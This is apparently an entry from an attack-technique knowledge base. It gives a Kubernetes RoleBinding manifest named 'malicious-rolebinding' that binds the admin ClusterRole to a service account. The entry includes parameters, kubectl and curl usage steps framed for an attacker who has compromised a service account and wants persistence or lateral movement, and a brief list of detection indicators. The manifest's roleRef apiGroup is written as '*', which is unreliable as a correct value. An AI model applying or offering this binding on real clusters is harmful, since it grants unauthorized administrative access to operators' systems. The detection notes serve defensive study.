---
id: 26140561-8a13-42f3-942d-5e36e7306dca
name: kubernetes-malicious-rolebinding-manifest
type: code
language: json
verified: true
created_at: '2023-04-06T03:56:01.304733+00:00'
updated_at: '2023-04-10T20:34:00.646741+00:00'
platforms:
  - Kubernetes
tags:
  - rbac
  - manifest
  - privilege-escalation
validated: true
---

# kubernetes-malicious-rolebinding-manifest

## Code

```json
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespace": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "sa-comp",
            "namespace": "default"
        }
    ]
}
```

## Description

This JSON manifest defines a malicious RoleBinding for Kubernetes RBAC. It binds the 'admin' ClusterRole, which grants full read/write access to all resources in the namespace, to a specified service account ('sa-comp' in the default namespace). When applied via kubectl or curl, it escalates the service account's privileges, allowing unauthorized actions like resource creation in restricted areas.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| name (metadata) | Name of the RoleBinding | "malicious-rolebinding" |
| namespace (metadata) | Target namespace for the binding | "default" |
| name (roleRef) | Name of the ClusterRole to bind (e.g., 'admin' or 'cluster-admin') | "admin" |
| name (subjects) | Name of the target service account | "sa-comp" |
| namespace (subjects) | Namespace of the service account | "default" |

## Usage

Save this manifest to a file (e.g., malicious-rolebinding.json) and apply it using kubectl apply -f malicious-rolebinding.json or via curl POST to the RBAC API endpoint. Use in scenarios where an attacker has compromised a service account and seeks to escalate its permissions for persistence or lateral movement in the cluster. Ensure the applying token has create RoleBindings permissions.

## Detection

- Audit logs showing POST to /apis/rbac.authorization.k8s.io/v1/namespaces/*/rolebindings with bindings to high-privilege roles like 'admin' or 'cluster-admin'.
- Anomalous service account permissions via 'kubectl get rolebindings -A' or RBAC introspection tools.
- Unexpected resource access from service accounts in kube-system or default namespaces.
- Use tools like Falco or Kubernetes Audit2RBAC for real-time monitoring of RBAC changes.

## Related

- [[procedures/kubernetes-rbac-privilege-escalation-via-malicious-rolebinding]]
- [[commands/curl-create-malicious-rolebinding]]
